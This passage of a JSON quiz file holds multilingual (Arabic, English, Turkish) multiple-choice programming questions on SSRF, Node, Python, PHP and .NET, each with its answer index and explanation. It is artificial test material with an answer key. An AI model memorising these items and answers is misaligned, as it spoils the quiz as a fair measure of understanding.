          "SSRF: الخادم يصل إلى خدمات داخلية وبيانات اعتماد السحابة؛ امنع العناوين الداخلية واسمح بـ http/https فقط",
          "XSS في صفحة المعاينة فقط",
          "بطء الخادم فقط",
          "لا خطر"
        ]
      },
      "en": {
        "prompt": "A \"link preview\" feature makes the server fetch any URL the user types. What is the biggest risk?",
        "explanation": "Your server sits inside the private network and can reach what the attacker cannot, like the cloud metadata service. Check the IP after DNS resolution, and watch for redirects to internal addresses.",
        "options": [
          "SSRF: the server reaches internal services and cloud credentials; block internal addresses and allow only http/https",
          "Only XSS in the preview",
          "Only a slower server",
          "No risk"
        ]
      },
      "tr": {
        "prompt": "Bir \"bağlantı önizleme\" özelliği, sunucunun kullanıcının yazdığı her URL’yi çekmesini sağlıyor. En büyük risk nedir?",
        "explanation": "Sunucun özel ağın içindedir ve saldırganın ulaşamadığı yerlere, örneğin bulut metadata servisine ulaşabilir. DNS çözümlemesinden sonra IP’yi kontrol et ve iç adreslere yönlendirmelere dikkat et.",
        "options": [
          "SSRF: sunucu iç servislere ve bulut kimlik bilgilerine ulaşır; iç adresleri engelle, sadece http/https’e izin ver",
          "Sadece önizlemede XSS",
          "Sadece yavaş sunucu",
          "Risk yok"
        ]
      }
    }
  },
  {
    "id": "n-j-package-lock",
    "level": "junior",
    "topic": "node",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "ما وظيفة ملف package-lock.json؟",
        "explanation": "package.json يقول «^4.18.0» مثلًا، أما الـ lock فيسجل 4.18.2 بالضبط مع كل الحزم الفرعية. يُرفع إلى Git، وnpm ci يثبّت منه حرفيًا.",
        "options": [
          "يثبّت الإصدارات الدقيقة لكل الحزم، فيحصل الجميع على نفس النسخ",
          "يمنع تثبيت حزم جديدة",
          "يحتوي كلمات مرور npm",
          "يُحذف بعد كل تثبيت"
        ]
      },
      "en": {
        "prompt": "What is package-lock.json for?",
        "explanation": "package.json may say \"^4.18.0\"; the lock file records exactly 4.18.2, plus every sub-dependency. Commit it to Git; npm ci installs exactly from it.",
        "options": [
          "Locks the exact version of every package, so everyone gets the same ones",
          "Stops new packages being installed",
          "Holds npm passwords",
          "Is deleted after each install"
        ]
      },
      "tr": {
        "prompt": "package-lock.json ne işe yarar?",
        "explanation": "package.json \"^4.18.0\" diyebilir; lock dosyası tam olarak 4.18.2’yi ve tüm alt bağımlılıkları kaydeder. Git’e ekle; npm ci birebir ondan kurar.",
        "options": [
          "Her paketin tam sürümünü sabitler; herkes aynı sürümleri alır",
          "Yeni paket kurulmasını engeller",
          "npm şifrelerini tutar",
          "Her kurulumdan sonra silinir"
        ]
      }
    }
  },
  {
    "id": "n-m-nexttick",
    "level": "mid",
    "topic": "node",
    "codeLang": "js",
    "code": "setTimeout(() => {\n  Promise.resolve().then(() => console.log('promise'));\n  process.nextTick(() => console.log('nextTick'));\n  console.log('timeout');\n}, 0);",
    "options": [
      "timeout, nextTick, promise",
      "timeout, promise, nextTick",
      "nextTick, promise, timeout",
      "promise, nextTick, timeout"
    ],
    "answer": 0,
    "text": {
      "ar": {
        "prompt": "ما ترتيب الطباعة؟",
        "explanation": "بعد انتهاء دالة setTimeout، يفرغ Node طابور process.nextTick أولًا، ثم طابور الـ Promises (microtasks). لذلك يأتي nextTick قبل promise."
      },
      "en": {
        "prompt": "In what order are things logged?",
        "explanation": "After the setTimeout callback finishes, Node drains the process.nextTick queue first, then the Promise (microtask) queue. So nextTick comes before promise."
      },
      "tr": {
        "prompt": "Konsola hangi sırayla yazılır?",
        "explanation": "setTimeout geri çağrısı bitince Node önce process.nextTick kuyruğunu, sonra Promise (microtask) kuyruğunu boşaltır. Bu yüzden nextTick, promise’ten önce gelir."
      }
    }
  },
  {
    "id": "n-s-memory-leak",
    "level": "senior",
    "topic": "node",
    "codeLang": "js",
    "code": "const cache = new Map();\n\napp.get('/product/:id', async (req, res) => {\n  if (!cache.has(req.params.id)) {\n    cache.set(req.params.id, await loadProduct(req.params.id));\n  }\n  res.json(cache.get(req.params.id));\n});",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "ذاكرة الخادم تزيد كل يوم حتى يتوقف. ما السبب في هذا الكود؟",
        "explanation": "كل id جديد يضيف عنصرًا يبقى للأبد، ويمكن لأي شخص طلب ملايين المعرّفات. الكاش في الذاكرة يحتاج حدًا أعلى وسياسة حذف.",
        "options": [
          "الكاش لا يحذف أي شيء أبدًا، حتى للمعرّفات العشوائية؛ استخدم LRU بحجم أقصى وTTL",
          "Map بطيئة",
          "async داخل المسار",
          "res.json يسرّب الذاكرة"
        ]
      },
      "en": {
        "prompt": "Server memory grows every day until it dies. What causes it in this code?",
        "explanation": "Every new id adds an entry that stays forever, and anyone can request millions of ids. An in-memory cache needs a size limit and an eviction policy.",
        "options": [
          "The cache never evicts anything, even for random ids; use an LRU with a max size and a TTL",
          "Map is slow",
          "async inside the route",
          "res.json leaks memory"
        ]
      },
      "tr": {
        "prompt": "Sunucu belleği her gün artıyor ve sonunda çöküyor. Bu kodda sebep nedir?",
        "explanation": "Her yeni kimlik sonsuza kadar kalan bir kayıt ekler ve herkes milyonlarca kimlik isteyebilir. Bellek içi önbelleğin üst sınırı ve silme politikası olmalı.",
        "options": [
          "Önbellek hiçbir şeyi silmiyor, rastgele kimlikler için bile; maksimum boyut ve TTL’li bir LRU kullan",
          "Map yavaştır",
          "Rotadaki async",
          "res.json bellek sızdırır"
        ]
      }
    }
  },
  {
    "id": "py-j-append-list",
    "level": "junior",
    "topic": "python",
    "codeLang": "py",
    "code": "nums = [1, 2, 3]\nnums.append([4, 5])\nprint(len(nums))",
    "options": [
      "4",
      "5",
      "3",
      "2"
    ],
    "answer": 0,
    "text": {
      "ar": {
        "prompt": "ماذا يطبع هذا الكود؟",
        "explanation": "append يضيف عنصرًا واحدًا، وهنا العنصر قائمة كاملة [4, 5]. لإضافة كل العناصر استخدم extend فيصبح الطول 5."
      },
      "en": {
        "prompt": "What does this code print?",
        "explanation": "append adds one item, and here that item is the whole list [4, 5]. To add each element, use extend; the length would be 5."
      },
      "tr": {
        "prompt": "Bu kod ne yazdırır?",
        "explanation": "append tek bir öğe ekler; burada o öğe [4, 5] listesinin kendisi. Her öğeyi eklemek için extend kullan; uzunluk 5 olur."
      }
    }
  },
  {
    "id": "py-m-mutable-default",
    "level": "mid",
    "topic": "python",
    "codeLang": "py",
    "code": "def add(item, items=[]):\n    items.append(item)\n    return items\n\nadd(1)\nprint(add(2))",
    "options": [
      "[1, 2]",
      "[2]",
      "[1]",
      "[]"
    ],
    "answer": 0,
    "text": {
      "ar": {
        "prompt": "ماذا يطبع هذا الكود؟",
        "explanation": "القيمة الافتراضية تُنشأ مرة واحدة عند تعريف الدالة، فتشترك كل الاستدعاءات في نفس القائمة. الحل: items=None ثم if items is None: items = []."
      },
      "en": {
        "prompt": "What does this code print?",
        "explanation": "The default value is created once, when the function is defined, so every call shares the same list. Fix: items=None, then if items is None: items = []."
      },
      "tr": {
        "prompt": "Bu kod ne yazdırır?",
        "explanation": "Varsayılan değer fonksiyon tanımlanırken bir kez oluşturulur; her çağrı aynı listeyi paylaşır. Çözüm: items=None, sonra if items is None: items = []."
      }
    }
  },
  {
    "id": "py-s-gil",
    "level": "senior",
    "topic": "python",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "حسابات CPU ثقيلة في Python لم تصبح أسرع مع 8 threads. لماذا، وما البديل؟",
        "explanation": "الـ threads مفيدة لانتظار الشبكة والقرص، لكن ليس للحساب. العمليات المنفصلة (أو مكتبات مثل NumPy التي تحرر الـ GIL) تستخدم كل الأنوية. وهناك إصدار تجريبي بدون GIL منذ Python 3.13.",
        "options": [
          "الـ GIL في CPython يسمح لخيط واحد بتنفيذ كود Python في كل لحظة؛ استخدم multiprocessing",
          "الـ threads في Python غير موجودة",
          "يجب استخدام asyncio لتسريع الحساب",
          "المعالج لا يدعم 8 خيوط"
        ]
      },
      "en": {
        "prompt": "Heavy CPU work in Python did not get faster with 8 threads. Why, and what is the alternative?",
        "explanation": "Threads help with waiting on network and disk, not with computation. Separate processes (or libraries like NumPy that release the GIL) use all cores. Python 3.13 also has an experimental build without the GIL.",
        "options": [
          "CPython’s GIL lets only one thread run Python code at a time; use multiprocessing",
          "Python has no threads",
          "Use asyncio to speed up the math",
          "The CPU cannot run 8 threads"
        ]
      },
      "tr": {
        "prompt": "Python’daki ağır CPU işi 8 thread ile hızlanmadı. Neden ve alternatif nedir?",
        "explanation": "Thread’ler ağ ve disk beklemede işe yarar, hesaplamada değil. Ayrı süreçler (veya GIL’i bırakan NumPy gibi kütüphaneler) tüm çekirdekleri kullanır. Python 3.13’te GIL’siz deneysel bir sürüm de var.",
        "options": [
          "CPython’daki GIL aynı anda yalnızca bir thread’in Python kodu çalıştırmasına izin verir; multiprocessing kullan",
          "Python’da thread yok",
          "Hesabı hızlandırmak için asyncio kullan",
          "İşlemci 8 thread çalıştıramaz"
        ]
      }
    }
  },
  {
    "id": "php-j-quotes",
    "level": "junior",
    "topic": "php",
    "codeLang": "php",
    "code": "$name = \"Sara\";\necho 'Hi $name', \"\\n\";\necho \"Hi $name\", \"\\n\";",
    "options": [
      "Hi $name, Hi Sara",
      "Hi Sara, Hi Sara",
      "Hi $name, Hi $name",
      "Hi Sara, Hi $name"
    ],
    "answer": 0,
    "text": {
      "ar": {
        "prompt": "ماذا يطبع هذا الكود؟",
        "explanation": "علامات التنصيص المفردة تبقي النص كما هو، والمزدوجة تستبدل المتغيرات بقيمها."
      },
      "en": {
        "prompt": "What does this code print?",
        "explanation": "Single quotes keep the text as is; double quotes replace variables with their values."
      },
      "tr": {
        "prompt": "Bu kod ne yazdırır?",
        "explanation": "Tek tırnak metni olduğu gibi bırakır; çift tırnak değişkenleri değerleriyle değiştirir."
      }
    }
  },
  {
    "id": "php-m-eager-loading",
    "level": "mid",
    "topic": "php",
    "codeLang": "php",
    "code": "$posts = Post::all();\nforeach ($posts as $post) {\n    echo $post->author->name;\n}",
    "options": [
      "Post::with('author')->get()",
      "Post::all()->fresh()",
      "Post::select('author')->get()",
      "Post::count()"
    ],
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "صفحة تعرض 50 مقالًا مع اسم الكاتب وتنفذ 51 استعلامًا. ما الحل في Eloquent؟",
        "explanation": "الوصول إلى $post->author يحمّل العلاقة كسولًا (lazy) لكل مقال. with() يجلب كل الكتّاب في استعلام ثانٍ واحد (eager loading)."
      },
      "en": {
        "prompt": "A page lists 50 posts with the author name and runs 51 queries. What is the fix in Eloquent?",
        "explanation": "Accessing $post->author lazy-loads the relation for each post. with() loads all the authors in one extra query (eager loading)."
      },
      "tr": {
        "prompt": "Bir sayfa 50 yazıyı yazar adıyla listeliyor ve 51 sorgu çalıştırıyor. Eloquent’te çözüm nedir?",
        "explanation": "$post->author’a erişmek ilişkiyi her yazı için tembel (lazy) yükler. with() tüm yazarları tek bir ek sorguda yükler (eager loading)."
      }
    }
  },
  {
    "id": "php-s-foreach-ref",
    "level": "senior",
    "topic": "php",
    "codeLang": "php",
    "code": "$a = [1, 2, 3];\nforeach ($a as &$v) {}\nforeach ($a as $v) {}\necho implode(\",\", $a), \"\\n\";",
    "options": [
      "1,2,2",
      "1,2,3",
      "3,3,3",
      "1,1,1"
    ],
    "answer": 0,
    "text": {
      "ar": {
        "prompt": "ماذا يطبع هذا الكود؟",
        "explanation": "بعد الحلقة الأولى يبقى $v مرجعًا لآخر عنصر. الحلقة الثانية تكتب كل قيمة في $v، أي في آخر عنصر، فيصبح 2 في النهاية. اكتب unset($v) بعد أي foreach بالمرجع."
      },
      "en": {
        "prompt": "What does this code print?",
        "explanation": "After the first loop $v is still a reference to the last element. The second loop writes each value into $v, which is that last element, so it ends as 2. Always unset($v) after a by-reference foreach."
      },
      "tr": {
        "prompt": "Bu kod ne yazdırır?",
        "explanation": "İlk döngüden sonra $v hâlâ son elemana referanstır. İkinci döngü her değeri $v’ye, yani son elemana yazar; sonunda 2 olur. Referanslı foreach’ten sonra her zaman unset($v) yaz."
      }
    }
  },
  {
    "id": "cs-j-var",
    "level": "junior",
    "topic": "dotnet",
    "codeLang": "cs",
    "code": "var count = 5;\ncount = \"five\";",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "ماذا يحدث في السطر الثاني؟",
        "explanation": "var لا يعني «أي نوع» كما في JavaScript، بل يطلب من المترجم استنتاج النوع مرة واحدة. بعدها يبقى المتغير int.",
        "options": [
          "خطأ ترجمة: النوع int استُنتج من القيمة الأولى",
          "يصبح count نصًا",
          "يصبح count = 0",
          "لا شيء"
        ]
      },
      "en": {
        "prompt": "What happens on the second line?",
        "explanation": "var does not mean \"any type\" like in JavaScript; it asks the compiler to infer the type once. After that the variable is an int.",
        "options": [
          "A compile error: the type int was inferred from the first value",
          "count becomes a string",
          "count becomes 0",
          "Nothing"
        ]
      },
      "tr": {
        "prompt": "İkinci satırda ne olur?",
        "explanation": "var, JavaScript’teki gibi \"her tip\" demek değildir; derleyiciden tipi bir kez çıkarmasını ister. Sonra değişken int olarak kalır.",
        "options": [
          "Derleme hatası: tip int ilk değerden çıkarıldı",
          "count metne dönüşür",
          "count 0 olur",
          "Hiçbir şey"
        ]
      }
    }
  },
  {
    "id": "cs-m-result-block",
    "level": "mid",
    "topic": "dotnet",
    "codeLang": "cs",
    "code": "public IActionResult Get(int id)\n{\n    var user = _service.GetUserAsync(id).Result;\n    return Ok(user);\n}",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "ما المشكلة في استخدام .Result هنا داخل ASP.NET Core؟",
        "explanation": "await يحرر الخيط ليخدم طلبات أخرى أثناء الانتظار. .Result و.Wait() يحجزانه (sync over async)، وفي بعض البيئات قد يسببان deadlock. اكتب: public async Task<IActionResult> Get(…).",
        "options": [
          "يحجز الخيط حتى ينتهي الطلب، فتنفد الخيوط تحت الضغط؛ استخدم async وawait حتى النهاية",
          "لا مشكلة",
          ".Result أسرع من await",
          "يرجع null دائمًا"
        ]
      },
      "en": {
        "prompt": "What is wrong with using .Result here in ASP.NET Core?",
        "explanation": "await frees the thread to serve other requests while waiting. .Result and .Wait() hold it (sync over async), and in some environments can deadlock. Write: public async Task<IActionResult> Get(…).",
        "options": [
          "It blocks the thread until the call finishes, so threads run out under load; use async and await all the way",
          "No problem",
          ".Result is faster than await",
          "It always returns null"
        ]
      },
      "tr": {
        "prompt": "ASP.NET Core’da burada .Result kullanmanın sorunu nedir?",
        "explanation": "await, beklerken thread’i başka isteklere hizmet etmesi için serbest bırakır. .Result ve .Wait() onu tutar (sync over async), bazı ortamlarda deadlock’a yol açabilir. Şöyle yaz: public async Task<IActionResult> Get(…).",
        "options": [
          "Çağrı bitene kadar thread’i kilitler, yük altında thread’ler tükenir; baştan sona async ve await kullan",
          "Sorun yok",
          ".Result await’ten hızlıdır",
          "Her zaman null döner"
        ]
      }
    }
  },
  {
    "id": "cs-s-captive-dependency",
    "level": "senior",
    "topic": "dotnet",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "خدمة مسجلة كـ Singleton تستقبل AppDbContext في الـ constructor. ما المشكلة؟",
        "explanation": "الخدمة الأطول عمرًا «تأسر» الأقصر عمرًا. الحل: اجعل الخدمة Scoped، أو احقن IServiceScopeFactory وأنشئ نطاقًا لكل عملية. وASP.NET Core يكشف ذلك في بيئة التطوير.",
        "options": [
          "captive dependency: نفس الـ DbContext (Scoped) يُشارك بين كل الطلبات، وهو ليس thread-safe",
          "لا مشكلة",
          "DbContext يصبح أسرع",
          "الـ Singleton يُنشأ مع كل طلب"
        ]
      },
      "en": {
        "prompt": "A service registered as Singleton takes AppDbContext in its constructor. What is the problem?",
        "explanation": "The longer-lived service \"captures\" the shorter-lived one. Fix: make the service Scoped, or inject IServiceScopeFactory and create a scope per operation. ASP.NET Core catches this in development.",
        "options": [
          "A captive dependency: one Scoped DbContext gets shared by every request, and it is not thread-safe",
          "No problem",
          "The DbContext gets faster",
          "The singleton is created per request"
        ]
      },
      "tr": {
        "prompt": "Singleton olarak kayıtlı bir servis constructor’da AppDbContext alıyor. Sorun nedir?",
        "explanation": "Uzun ömürlü servis kısa ömürlüyü \"esir alır\". Çözüm: servisi Scoped yap ya da IServiceScopeFactory enjekte edip her işlem için bir kapsam oluştur. ASP.NET Core geliştirmede bunu yakalar.",
        "options": [
          "Captive dependency: Scoped bir DbContext tüm isteklerce paylaşılır ve thread-safe değildir",
          "Sorun yok",
          "DbContext hızlanır",
          "Singleton her istekte oluşturulur"
        ]
      }
    }
  }
]
